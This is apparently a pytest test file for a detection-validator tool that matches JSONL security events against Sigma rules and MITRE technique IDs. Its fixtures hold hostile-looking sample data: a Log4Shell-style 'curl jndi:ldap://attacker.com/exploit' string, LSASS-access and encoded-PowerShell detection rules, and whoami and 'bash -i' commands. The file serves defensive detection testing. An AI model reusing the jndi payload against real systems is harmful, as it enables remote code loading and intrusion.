"""
Tests for validator/matcher.py — offline JSONL event matching.

All tests use temporary files written in the test; no network or SIEM needed.
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from detection_validator.normalizer.schema import (
    CanonicalDetection,
    DetectionFormat,
    DetectionLogic,
    MitreTechnique,
    Severity,
)
from detection_validator.validator.matcher import (
    _eval_field_condition,
    _eval_group,
    _eval_sigma_corpus,
    _keyword_tokens,
    _match_one,
    _match_techniques,
    _match_keywords,
    load_events,
    match_corpus,
)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _now_iso() -> str:
    return datetime.now(tz=timezone.utc).isoformat()


def _ago_iso(hours: float) -> str:
    t = datetime.now(tz=timezone.utc) - timedelta(hours=hours)
    return t.isoformat()


def _write_events(path: Path, events: list[dict]) -> None:
    with open(path, "w") as fh:
        for ev in events:
            print(json.dumps(ev), file=fh)


def _make_detection(
    name: str = "Test Rule",
    techniques: list[str] | None = None,
    raw_logic: str = "",
) -> CanonicalDetection:
    techs = []
    for tid in (techniques or []):
        base = tid.split(".")[0]
        sub = tid if "." in tid else None
        techs.append(MitreTechnique(technique_id=base, sub_technique_id=sub,
                                    tactic="execution"))
    return CanonicalDetection(
        name=name,
        description="test",
        detection_logic=DetectionLogic(raw=raw_logic, language="sigma",
                                       normalized_conditions=[], field_references=[]),
        log_sources=[],
        mitre_techniques=techs,
        severity=Severity.MED,
        source_format=DetectionFormat.SIGMA,
    )


# ── Unit: _keyword_tokens ─────────────────────────────────────────────────────

class TestKeywordTokens:

    def test_basic_extraction(self) -> None:
        tokens = _keyword_tokens(["jndi", "exploit", "log4j"])
        assert "jndi" in tokens
        assert "exploit" in tokens
        assert "log4j" in tokens

    def test_strips_wildcards(self) -> None:
        tokens = _keyword_tokens(["*jndi*", "exploit*"])
        assert "jndi" in tokens
        assert "exploit" in tokens

    def test_skips_short_tokens(self) -> None:
        tokens = _keyword_tokens(["id", "ls", "ok", "curl"])
        # "id", "ls", "ok" are < 4 chars; "curl" is exactly 4
        assert "id" not in tokens
        assert "ls" not in tokens
        assert "curl" in tokens

    def test_deduplicates(self) -> None:
        tokens = _keyword_tokens(["jndi", "JNDI", "jndi"])
        assert tokens.count("jndi") == 1

    def test_splits_on_punctuation(self) -> None:
        tokens = _keyword_tokens(["curl:jndi"])
        assert "curl" in tokens
        assert "jndi" in tokens

    def test_empty_input(self) -> None:
        assert _keyword_tokens([]) == []


# ── Unit: _match_one ─────────────────────────────────────────────────────────

class TestMatchOne:

    def test_matches_by_technique_field(self) -> None:
        events = [
            {"technique": "T1190", "cmd_output": "some output"},
            {"technique": "T1059", "cmd_output": "other"},
        ]
        count, samples = _match_one(["T1190"], [], events)
        assert count == 1
        assert samples[0]["technique"] == "T1190"

    def test_matches_base_technique_for_subtechnique(self) -> None:
        # Event has T1059; rule has T1059.004 — base T1059 should match
        events = [{"technique": "T1059", "cmd_output": "bash -i"}]
        count, _ = _match_one(["T1059.004"], [], events)
        assert count == 1

    def test_matches_by_keyword_in_proctitle(self) -> None:
        events = [{"proctitle": "curl jndi:ldap://attacker.com/exploit"}]
        count, _ = _match_one([], ["jndi"], events)
        assert count == 1

    def test_matches_by_keyword_in_cmd_output(self) -> None:
        events = [{"cmd_output": "log4shell exploit detected"}]
        count, _ = _match_one([], ["log4shell"], events)
        assert count == 1

    def test_no_match_when_no_overlap(self) -> None:
        events = [{"technique": "T1046", "cmd_output": "nmap scan"}]
        count, _ = _match_one(["T1190"], ["jndi"], events)
        assert count == 0

    def test_returns_at_most_3_samples(self) -> None:
        events = [{"technique": "T1190"} for _ in range(10)]
        count, samples = _match_one(["T1190"], [], events)
        assert count == 10
        assert len(samples) <= 3

    def test_empty_events(self) -> None:
        count, samples = _match_one(["T1190"], ["jndi"], [])
        assert count == 0
        assert samples == []

    def test_case_insensitive_technique_match(self) -> None:
        events = [{"technique": "t1190"}]
        count, _ = _match_one(["T1190"], [], events)
        assert count == 1

    def test_keyword_not_in_irrelevant_field(self) -> None:
        # "jndi" is only in a field not checked by the matcher
        events = [{"exe": "/usr/bin/jndi-lookup", "technique": "T1046"}]
        count, _ = _match_one(["T1190"], ["jndi"], events)
        # technique doesn't match, and "exe" is not in _FREE_TEXT_FIELDS
        assert count == 0

    def test_technique_takes_priority_over_keyword(self) -> None:
        events = [{"technique": "T1190", "proctitle": "jndi exploit"}]
        tech_count, _ = _match_techniques(["T1190"], events)
        kw_count, _   = _match_keywords(["jndi"], events)
        assert tech_count == 1
        assert kw_count == 1   # both match; corpus returns technique first

    def test_match_techniques_returns_empty_on_no_techniques(self) -> None:
        events = [{"technique": "T1190"}]
        count, samples = _match_techniques([], events)
        assert count == 0
        assert samples == []

    def test_match_keywords_empty_tokens_never_matches(self) -> None:
        events = [{"proctitle": "anything"}]
        count, _ = _match_keywords([], events)
        assert count == 0


# ── Unit: load_events ────────────────────────────────────────────────────────

class TestLoadEvents:

    def test_reads_valid_jsonl(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [{"technique": "T1190"}, {"technique": "T1059"}])
        events = load_events(path, since_dt=None)
        assert len(events) == 2

    def test_skips_blank_lines(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        path.write_text('\n{"technique": "T1190"}\n\n{"technique": "T1059"}\n')
        events = load_events(path, since_dt=None)
        assert len(events) == 2

    def test_skips_malformed_lines(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        path.write_text('{"technique": "T1190"}\nnot json\n{"technique": "T1059"}\n')
        events = load_events(path, since_dt=None)
        assert len(events) == 2

    def test_time_filter_excludes_old_events(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _ago_iso(0.25)},  # 15 min ago — within window
            {"technique": "T1059", "timestamp": _ago_iso(48)},    # 2 days ago — excluded
        ])
        cutoff = datetime.now(tz=timezone.utc) - timedelta(hours=1)
        events = load_events(path, since_dt=cutoff)
        assert len(events) == 1
        assert events[0]["technique"] == "T1190"

    def test_no_time_filter_returns_all(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _ago_iso(999)},
        ])
        events = load_events(path, since_dt=None)
        assert len(events) == 1

    def test_accepts_at_timestamp_field(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "@timestamp": _ago_iso(0.1)},
        ])
        cutoff = datetime.now(tz=timezone.utc) - timedelta(hours=1)
        events = load_events(path, since_dt=cutoff)
        assert len(events) == 1


# ── Integration: match_corpus ────────────────────────────────────────────────

class TestMatchCorpus:

    def test_technique_only_on_technique_hit(self, tmp_path: Path) -> None:
        # No detection logic → field evaluation skipped → technique_only (not PASSED).
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _now_iso()},
        ])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert len(results) == 1
        assert results[0].status == "technique_only"
        assert results[0].hit_count == 1

    def test_fail_on_no_matching_events(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1046", "timestamp": _now_iso()},
        ])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "no_match"
        assert results[0].hit_count == 0

    def test_keyword_only_from_detection_logic(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"proctitle": "curl jndi:ldap://attacker.com", "timestamp": _now_iso()},
        ])
        # keywords-only Sigma rule → untranslatable (no field groups) → falls to
        # keyword tier → keyword_only (not PASSED).
        detection = _make_detection(raw_logic=(
            "detection:\n  keywords:\n    - jndi\ncondition: keywords"
        ))
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "keyword_only"

    def test_skip_when_no_techniques_and_no_keywords(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [{"technique": "T1190", "timestamp": _now_iso()}])
        detection = _make_detection()  # no techniques, no raw logic keywords
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "skip"

    def test_error_when_file_not_found(self) -> None:
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], Path("/nonexistent/path.jsonl"))

        assert results[0].status == "error"
        assert results[0].error

    def test_multiple_detections(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _now_iso()},
        ])
        d1 = _make_detection(name="Rule A", techniques=["T1190"])
        d2 = _make_detection(name="Rule B", techniques=["T1059"])
        results = match_corpus([d1, d2], path, since_hours=1)

        assert len(results) == 2
        statuses = {r.name: r.status for r in results}
        assert statuses["Rule A"] == "technique_only"   # no field logic → not PASSED
        assert statuses["Rule B"] == "no_match"

    def test_since_hours_zero_matches_all(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [
            {"technique": "T1190", "timestamp": _ago_iso(999)},
        ])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=0)

        assert results[0].status == "technique_only"

    def test_result_siem_is_local(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        _write_events(path, [])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].siem == "local"

    def test_samples_populated_on_hit(self, tmp_path: Path) -> None:
        path = tmp_path / "events.jsonl"
        ev = {"technique": "T1190", "cmd_output": "exploit output", "timestamp": _now_iso()}
        _write_events(path, [ev])
        detection = _make_detection(techniques=["T1190"])
        results = match_corpus([detection], path, since_hours=1)

        assert len(results[0].sample_events) == 1
        assert results[0].sample_events[0]["technique"] == "T1190"


# ── Unit: _eval_field_condition and _eval_group ───────────────────────────────


class TestEvalFieldCondition:

    def test_exact_match(self) -> None:
        assert _eval_field_condition("Image", r"C:\Windows\cmd.exe", {"Image": r"C:\Windows\cmd.exe"})

    def test_exact_no_match(self) -> None:
        assert not _eval_field_condition("Image", "powershell.exe", {"Image": "cmd.exe"})

    def test_contains_match(self) -> None:
        assert _eval_field_condition("CommandLine|contains", "whoami", {"CommandLine": "cmd.exe /c whoami"})

    def test_contains_no_match(self) -> None:
        assert not _eval_field_condition("CommandLine|contains", "whoami", {"CommandLine": "calc.exe"})

    def test_startswith(self) -> None:
        assert _eval_field_condition("Image|startswith", r"C:\Windows", {"Image": r"C:\Windows\System32\cmd.exe"})

    def test_endswith(self) -> None:
        assert _eval_field_condition("Image|endswith", "lsass.exe", {"Image": r"C:\Windows\System32\lsass.exe"})

    def test_list_value_any_matches(self) -> None:
        # OR semantics for list values
        assert _eval_field_condition("Image|endswith", ["cmd.exe", "powershell.exe"], {"Image": r"C:\powershell.exe"})

    def test_list_value_none_matches(self) -> None:
        assert not _eval_field_condition("Image|endswith", ["cmd.exe", "mshta.exe"], {"Image": r"C:\calc.exe"})

    def test_missing_field_returns_false(self) -> None:
        assert not _eval_field_condition("NonExistentField", "value", {"Image": "cmd.exe"})

    def test_case_insensitive_field_lookup(self) -> None:
        # event key casing differs from Sigma field name
        assert _eval_field_condition("commandline|contains", "whoami", {"CommandLine": "whoami /all"})

    def test_case_insensitive_value_match(self) -> None:
        assert _eval_field_condition("Image|endswith", "CMD.EXE", {"Image": r"C:\Windows\cmd.exe"})


class TestEvalGroup:

    def test_all_fields_match(self) -> None:
        group = {
            "Image|endswith": "lsass.exe",
            "GrantedAccess|contains": "0x1010",
        }
        event = {"Image": r"C:\Windows\lsass.exe", "GrantedAccess": "0x1010"}
        assert _eval_group(group, event)

    def test_partial_field_match_fails(self) -> None:
        # Field A matches but field B does not → group requires AND → False
        group = {
            "Image|endswith": "lsass.exe",
            "GrantedAccess|contains": "0x1410",
        }
        event = {"Image": r"C:\Windows\lsass.exe", "GrantedAccess": "0x0000"}
        assert not _eval_group(group, event)

    def test_empty_group_matches(self) -> None:
        # Empty group has no conditions → vacuously True
        assert _eval_group({}, {"anything": "value"})


# ── Required acceptance tests (spec §a, §b, §c) ──────────────────────────────


_SIGMA_AND_RULE = """\
title: LSASS Access with Specific GrantedAccess
detection:
  selection:
    Image|endswith: 'lsass.exe'
    GrantedAccess|contains: '0x1410'
  condition: selection
"""

_SIGMA_FULL_MATCH_RULE = """\
title: Suspicious PowerShell Encoded Command
detection:
  selection:
    Image|endswith: 'powershell.exe'
    CommandLine|contains: '-EncodedCommand'
  condition: selection
"""

_SIGMA_UNSUPPORTED_CONDITION = """\
title: Complex near() condition
detection:
  sel1:
    Image|endswith: 'cmd.exe'
  sel2:
    CommandLine|contains: 'whoami'
  condition: sel1 near sel2
"""


class TestAcceptanceCriteria:
    """Spec §a / §b / §c from the task brief."""

    # ── §a: partial field match must NOT be PASSED ────────────────────────────

    def test_partial_field_match_is_technique_only_not_passed(self, tmp_path: Path) -> None:
        """
        Rule requires Image|endswith lsass.exe AND GrantedAccess|contains 0x1410.
        Corpus has an event with only Image matching (GrantedAccess missing).
        Must produce technique_only (or no_match), never condition_match/PASSED.
        """
        path = tmp_path / "events.jsonl"
        _write_events(path, [{
            "technique": "T1003.001",
            "Image": r"C:\Windows\System32\lsass.exe",
            # GrantedAccess intentionally absent
            "timestamp": _now_iso(),
        }])
        detection = _make_detection(
            techniques=["T1003.001"],
            raw_logic=_SIGMA_AND_RULE,
        )
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status != "condition_match", (
            "Partial field match must not produce condition_match"
        )
        assert results[0].status == "technique_only", (
            f"Expected technique_only, got {results[0].status}"
        )
        from detection_validator.normalizer.schema import ValidationStatus
        assert detection.validation_status != ValidationStatus.PASSED

    def test_both_fields_absent_is_not_passed(self, tmp_path: Path) -> None:
        """Even with a technique-matching event, absent fields → not PASSED."""
        path = tmp_path / "events.jsonl"
        _write_events(path, [{
            "technique": "T1003.001",
            "timestamp": _now_iso(),
        }])
        detection = _make_detection(
            techniques=["T1003.001"],
            raw_logic=_SIGMA_AND_RULE,
        )
        results = match_corpus([detection], path, since_hours=1)
        assert results[0].status == "technique_only"

    # ── §b: full field match → condition_match / PASSED ──────────────────────

    def test_full_field_match_is_condition_match_and_passed(self, tmp_path: Path) -> None:
        """
        Rule requires Image|endswith powershell.exe AND CommandLine|contains -EncodedCommand.
        Corpus has an event satisfying both fields → condition_match → PASSED.
        """
        path = tmp_path / "events.jsonl"
        _write_events(path, [{
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
            "timestamp": _now_iso(),
        }])
        detection = _make_detection(
            techniques=["T1059.001"],
            raw_logic=_SIGMA_FULL_MATCH_RULE,
        )
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "condition_match"
        assert results[0].hit_count >= 1
        from detection_validator.normalizer.schema import ValidationStatus
        assert detection.validation_status == ValidationStatus.PASSED

    def test_condition_match_with_no_technique_in_event(self, tmp_path: Path) -> None:
        """Field logic match is independent of technique field in the event."""
        path = tmp_path / "events.jsonl"
        _write_events(path, [{
            "Image": r"C:\powershell.exe",
            "CommandLine": "powershell.exe -EncodedCommand abc",
            "timestamp": _now_iso(),
        }])
        detection = _make_detection(
            techniques=["T1059.001"],
            raw_logic=_SIGMA_FULL_MATCH_RULE,
        )
        results = match_corpus([detection], path, since_hours=1)
        assert results[0].status == "condition_match"

    # ── §c: unsupported condition → untranslatable ────────────────────────────

    def test_unsupported_condition_is_untranslatable(self, tmp_path: Path) -> None:
        """
        A condition using 'near' (not in the supported set) must produce
        'untranslatable' and must NOT fall through to technique_only.
        """
        path = tmp_path / "events.jsonl"
        _write_events(path, [{
            "technique": "T1059.003",
            "Image": r"C:\cmd.exe",
            "CommandLine": "whoami",
            "timestamp": _now_iso(),
        }])
        detection = _make_detection(
            techniques=["T1059.003"],
            raw_logic=_SIGMA_UNSUPPORTED_CONDITION,
        )
        results = match_corpus([detection], path, since_hours=1)

        assert results[0].status == "untranslatable", (
            f"Expected untranslatable, got {results[0].status}"
        )
        assert results[0].error, "untranslatable result must carry an error string"
        assert results[0].status != "technique_only", (
            "Must not silently fall through to technique_only"
        )
        from detection_validator.normalizer.schema import ValidationStatus
        assert detection.validation_status != ValidationStatus.PASSED

    def test_untranslatable_carries_condition_name(self, tmp_path: Path) -> None:
        """Error string must name the unsupported pattern."""
        path = tmp_path / "events.jsonl"
        _write_events(path, [{"technique": "T1059.003", "timestamp": _now_iso()}])
        detection = _make_detection(
            techniques=["T1059.003"],
            raw_logic=_SIGMA_UNSUPPORTED_CONDITION,
        )
        results = match_corpus([detection], path, since_hours=1)
        assert "near" in results[0].error.lower() or "unsupported" in results[0].error.lower()
